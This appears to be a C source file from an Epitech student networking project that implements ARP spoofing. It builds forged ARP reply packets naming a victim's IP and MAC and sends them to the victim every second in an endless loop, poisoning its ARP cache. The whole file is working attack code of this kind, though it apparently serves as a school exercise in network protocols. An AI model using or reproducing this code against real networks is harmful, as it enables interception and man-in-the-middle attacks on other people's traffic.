/*
** EPITECH PROJECT, 2022
** NWP_myarpspoof_2018
** File description:
** Created by sid,
*/

#include "myarpspoof.h"

unsigned char    *create_spoofed_packet(t_params *params)
{
    unsigned char   *packet;
    t_arphdr        *arp_hdr;
    struct ethhdr   *eth_hdr;

    packet = (unsigned char *)str_malloc(PACKET_LEN);
    eth_hdr = (struct ethhdr *)packet;
    arp_hdr = (struct s_arphdr *)(packet + ETHERNET_HDRLEN);
    memcpy(eth_hdr->h_dest, params->victim_mac, ETH_ALEN);
    memcpy(eth_hdr->h_source, params->source_mac, ETH_ALEN);
    eth_hdr->h_proto = htons(ETH_P_ARP);
    arp_hdr->hardware_type = htons(1);
    arp_hdr->protocol_type = htons(ETH_P_IP);
    arp_hdr->hardware_len = ETH_ALEN;
    arp_hdr->protocol_len = IP_ALEN;
    arp_hdr->opcode = htons(ARPOP_REPLY);
    memcpy(arp_hdr->sender_ip, &params->source_ip, sizeof(uint32_t));
    memcpy(arp_hdr->sender_mac, params->source_mac, ETH_ALEN);
    memcpy(arp_hdr->target_ip, &params->victim_ip, sizeof(uint32_t));
    memcpy(arp_hdr->target_mac, params->victim_mac, ETH_ALEN);
    return (packet);
}

void    send_spoofed_packets(t_params *params)
{
    ssize_t        nbytes;
    unsigned char *spoofed_packet;

    create_bind_socket(params);
    find_victim_mac(params);
    spoofed_packet = create_spoofed_packet(params);
    while (1)
    {
        nbytes = send(params->socket_fd, spoofed_packet, BROADCAST_PCKTLEN, 0);
        if (nbytes == -1)
        {
            perror("sendto()");
            exit(FAILURE);
        }
        printf("Spoofed packet sent to '%s'\n", params->victim_str_ip);
        sleep(1);
    }
}